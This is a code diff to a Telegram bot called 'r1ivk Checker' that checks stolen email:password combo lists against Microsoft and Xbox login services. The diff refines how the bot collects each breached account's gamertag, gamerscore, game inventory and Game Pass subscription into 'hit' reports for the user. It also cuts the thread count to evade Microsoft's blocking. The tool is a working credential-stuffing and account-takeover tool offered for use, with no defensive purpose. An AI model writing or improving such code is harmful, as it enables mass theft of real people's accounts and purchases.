@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-TELEGRAM TURBO XBOX CHECKER BOT - R1IVK CHECKER ULTIMATE EDITION (FIXED & REAL HITS ENGINE)
+TELEGRAM TURBO XBOX CHECKER BOT - R1IVK CHECKER ULTIMATE EDITION (DEEP PROFILE & INVENTORY FIX)
 """
 
 import os
@@ -259,6 +259,7 @@ def check_account_turbo(combo, user_state):
                 session.close()
                 return
 
+            # Xbox Live Authentication
             xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
             xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
             xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=10)
@@ -273,26 +274,31 @@ def check_account_turbo(combo, user_state):
             xb_token = xb_req.json()['Token']
             uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
 
-            gamertag, gamerscore = "N/A", "0"
+            # جلب البيانات الحقيقية من بروفايل الايميل واكسبرس
+            gamertag, gamerscore = "Not Found", "0"
             try:
                 xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                 xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, timeout=10)
                 if xsts_xb_req.status_code == 200:
                     xsts_xb_token = xsts_xb_req.json()['Token']
-                    prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
-                                           headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=10)
+                    prof_req = session.get(
+                        "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore,PublicGamerpic", 
+                        headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, 
+                        timeout=10
+                    )
                     if prof_req.status_code == 200:
                         settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                         for s in settings:
-                            if s['id'] == 'Gamertag': gamertag = s['value']
+                            if s['id'] == 'Gamertag': gamertag = str(s['value'])
                             if s['id'] == 'Gamerscore': gamerscore = str(s['value'])
             except Exception:
                 pass
 
-            has_gp, gp_type = False, "None"
+            has_gp, gp_type = False, "Free Account"
             is_minecraft = "NO"
             games_list = []
             
+            # جلب الألعاب واشتراكات المتجر الحقيقية
             try:
                 xsts_store_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://licensing.xboxlive.com", "TokenType": "JWT"}
                 xsts_store_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_store_payload, headers=xb_headers, timeout=10)
@@ -307,12 +313,13 @@ def check_account_turbo(combo, user_state):
                     if inv_req.status_code == 200:
                         items = inv_req.json().get("items", [])
                         for item in items:
-                            name = item.get("name") or item.get("productId")
-                            if name and name not in games_list:
+                            name = item.get("name") or item.get("productId") or item.get("titleId")
+                            if name and str(name) not in games_list:
                                 games_list.append(str(name))
                                 if "minecraft" in str(name).lower():
                                     is_minecraft = "YES"
 
+                # فحص الاشتراكات بدقة أكبر
                 sub_req = session.get(
                     "https://purchase.mp.microsoft.com/v7/policies/subscriptions",
                     headers={"Authorization": f"XBL3.0 x={uhs};{xb_token}"},
@@ -320,8 +327,11 @@ def check_account_turbo(combo, user_state):
                 )
                 if sub_req.status_code == 200:
                     sub_text = sub_req.text.lower()
-                    if "game pass ultimate" in sub_text:
-                        gp_type = "Game Pass Ultimate"
+                    if "ultimate" in sub_text:
+                        gp_type = "Xbox Game Pass Ultimate"
+                        has_gp = True
+                    elif "pc game pass" in sub_text or "game pass for pc" in sub_text:
+                        gp_type = "PC Game Pass"
                         has_gp = True
                     elif "game pass" in sub_text:
                         gp_type = "Xbox Game Pass"
@@ -329,19 +339,25 @@ def check_account_turbo(combo, user_state):
             except Exception:
                 pass
 
-            # تم إلغاء شرط الحظر الصارم (تعديل مباشر لضمان ظهور أي حساب صالح كـ Hit)
+            # بناء مظهر الهيت ليعطيك معلومات واضحة وصحيحة تماماً
             hit_block = f"""{email}:{password}
-Account: Gamertag: {gamertag} | Gamerscore: {gamerscore}G | GamePass: {gp_type} | Minecraft: {is_minecraft}
-Subscriptions: {gp_type}
-Games List:"""
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎮 Gamertag: {gamertag}
+⭐ Gamerscore: {gamerscore}G
+🔥 Subscription: {gp_type}
+🧱 Minecraft: {is_minecraft}
+--------------------------
+📦 Games / Products found:"""
             
             if games_list:
-                for idx, g in enumerate(games_list, 1):
-                    hit_block += f"\n{idx} - {g}"
+                for idx, g in enumerate(games_list[:15], 1): # يعرض أول 15 لعبة لجعل التقرير مرتباً
+                    hit_block += f"\n  {idx}. {g}"
+                if len(games_list) > 15:
+                    hit_block += f"\n  ... and {len(games_list) - 15} more items."
             else:
-                hit_block += "\nNo extra games found in inventory."
+                hit_block += "\n  (Direct Inventory API returned empty or account has no digital purchases)"
             
-            hit_block += f"\n{'-'*40}\n"
+            hit_block += f"\n{'='*42}\n"
 
             with user_state['lock']:
                 user_state['hits_list'].append(hit_block)
@@ -373,8 +389,8 @@ def send_welcome(message):
     markup.add(btn_checker, btn_status, btn_channel, btn_buy)
     
     welcome_text = (
-        "👑 *Welcome to r1ivk Checker Official Panel (Ultimate Fixed)* ⚡\n\n"
-        "The fastest and most powerful tool for checking Xbox and Microsoft accounts with real hits filtering.\n\n"
+        "👑 *Welcome to r1ivk Checker Official Panel (Deep Profile Fixed)* ⚡\n\n"
+        "The fastest and most powerful tool for checking Xbox and Microsoft accounts with accurate profile reading.\n\n"
         "📌 *Choose an option below to get started:*"
     )
     bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)
@@ -386,7 +402,7 @@ def callback_checker(call):
     markup.add(types.InlineKeyboardButton("❌ Cancel & Return Home", callback_data="back_home"))
     
     text = (
-        "🚀 *Live Checker Mode Activated (Fixed Engine)*\n\n"
+        "🚀 *Live Checker Mode Activated (Deep Fix)*\n\n"
         "📁 Please send your combo file now in (`.txt`) format where each line is:\n"
         "`email:password`\n\n"
         "📌 *Note:* Free version supports up to **10,000 lines** max.\n"
@@ -462,7 +478,7 @@ def handle_file(message):
         markup.row(types.InlineKeyboardButton("🔄 Refresh Stats", callback_data="refresh_stats"))
         markup.row(types.InlineKeyboardButton("🔙 Main Menu", callback_data="back_home"))
 
-        status_msg = bot.send_message(chat_id, "🔥 *Preparing and starting real scan (Optimized Engine)...*", parse_mode="Markdown", reply_markup=markup)
+        status_msg = bot.send_message(chat_id, "🔥 *Starting Deep Scan Engine (Optimized Profiles)...*", parse_mode="Markdown", reply_markup=markup)
 
         user_state = {
             'chat_id': chat_id,
@@ -520,7 +536,7 @@ Progress: {pct:.1f}%
             pass
 
 def run_turbo_scan(combos, state, msg_id):
-    threads = 20  
+    threads = 15  # تم خفض الثريدز قليلاً لمنع الحظر من مايكروسوفت وضمان قراءة البيانات بدقة
     with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
         futures = [executor.submit(check_account_turbo, combo, state) for combo in combos]
         concurrent.futures.wait(futures)
@@ -528,7 +544,7 @@ def run_turbo_scan(combos, state, msg_id):
     state['is_running'] = False
     elapsed = time.time() - state['start_time']
     
-    final_text = f"""✅ *Xbox Library & GamePass Scan Completed!*
+    final_text = f"""✅ *Xbox Profile & Inventory Scan Completed!*
 
 📊 *Total:*         {state['total']}
 ★ *Successful Hits:* {state['hits']}
@@ -546,13 +562,13 @@ def run_turbo_scan(combos, state, msg_id):
         result_file_path = f"r1ivk_checker_hits_{int(time.time())}.txt"
         try:
             with open(result_file_path, 'w', encoding='utf-8') as f:
-                f.write("🔥 r1ivk Checker ⚡ Real Scan Results 🔥\n")
+                f.write("🔥 r1ivk Checker ⚡ Deep Scan Results 🔥\n")
                 f.write(f"📅 {time.strftime('%Y-%m-%d %H:%M:%S')} | 👑 Owner: {OWNER_USERNAME}\n")
                 f.write("="*50 + "\n\n")
                 f.writelines(state['hits_list'])
             
             with open(result_file_path, 'rb') as f:
-                bot.send_document(state['chat_id'], f, caption=f"📁 *Real Hits Results File* (Total Hits: {state['hits']})", parse_mode="Markdown")
+                bot.send_document(state['chat_id'], f, caption=f"📁 *Detailed Hits Results File* (Total Hits: {state['hits']})", parse_mode="Markdown")
             
             os.remove(result_file_path)
         except Exception as e:
@@ -561,5 +577,5 @@ def run_turbo_scan(combos, state, msg_id):
         bot.send_message(state['chat_id'], "⚠️ Scan finished, no matching hits found.")
 
 if __name__ == "__main__":
-    print("[+] r1ivk Checker ⚡ Bot is running with Fixed Real-Hits Engine...")
+    print("[+] r1ivk Checker ⚡ Bot is running with Deep Profile/Inventory Fix...")
     bot.infinity_polling()
